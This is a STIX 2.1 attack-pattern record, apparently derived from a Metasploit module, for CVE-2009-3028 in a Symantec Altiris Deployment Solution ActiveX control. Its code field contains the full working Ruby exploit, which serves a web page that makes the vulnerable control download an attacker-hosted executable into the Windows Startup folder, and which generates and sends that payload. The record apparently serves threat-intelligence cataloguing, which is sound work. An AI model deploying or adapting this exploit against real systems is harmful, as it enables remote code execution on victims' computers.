{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08dc5d77-56ee-4f06-a90e-71ece4e192d7",
    "created": "2024-08-14T16:40:09.768813Z",
    "modified": "2024-08-14T16:40:09.768817Z",
    "name": "Symantec Altiris Deployment Solution ActiveX Control Arbitrary File Download and Execute",
    "description": " This module allows remote attackers to install and execute arbitrary files on a users file system via AeXNSPkgDLLib.dll (6.0.0.1418). This module was tested against Symantec Altiris Deployment Solution 6.9 sp3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/symantec_altirisdeployment_downloadandinstall.rb",
            "external_id": "symantec_altirisdeployment_downloadandinstall.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3028"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec Altiris Deployment Solution ActiveX Control Arbitrary File Download and Execute',\n      'Description'    => %q{\n          This module allows remote attackers to install and execute arbitrary files on a users file system via\n        AeXNSPkgDLLib.dll (6.0.0.1418). This module was tested against Symantec Altiris Deployment Solution 6.9 sp3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'BID', '36346' ],\n          [ 'CVE', '2009-3028' ],\n          [ 'OSVDB', '57893' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions' =>\n        {\n          'HTTP::compression' => 'gzip'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2009-09-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('PATH',    [ true, \"The path to place the executable.\", 'C:\\\\\\\\Documents and Settings\\\\\\\\All Users\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\' ]),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/PAYLOAD\"\n\n    if (request.uri.match(/PAYLOAD/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending payload EXE\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    vname  = rand_text_alpha(rand(100) + 1)\n    exe    = rand_text_alpha_upper(rand(5) + 1)\n\n    content = %Q|<html>\n<head>\n<script>\ntry {\n  var #{vname} = new ActiveXObject('Altiris.AeXNSPkgDL.1');\n  #{vname}.DownloadAndInstall(\"#{payload_url}/#{exe}.EXE\", \"#{datastore['PATH']}\\\\\\\\#{exe}.EXE\", \"#{datastore['PATH']}\\\\\\\\#{exe}.EXE\", \"\", \"\");\n} catch( e ) { window.location = 'about:blank' ; }\n</script>\n</head>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\n\nend\n=begin\nC:\\Program Files\\Altiris\\eXpress\\Deployment Web Console\\DSWeb\\utils\\AltirisNSConsole.zip\n\naltiris_deploymentsolution_win_6_9_sp3_server.zip\n\n[id(0x00000007), helpstring(\"method DownloadAndInstall\")]\nvoid DownloadAndInstall(\n  [in] BSTR Src,\n  [in] BSTR Dest,\n  [in] BSTR InstCmdLine,\n  [in] BSTR UpgdCmdLine,\n  [in] BSTR ProdCode);\n=end\n",
    "x_mitre_disclosure_date": "2009-09-09",
    "x_mitre_platforms": [
        "win'"
    ]
}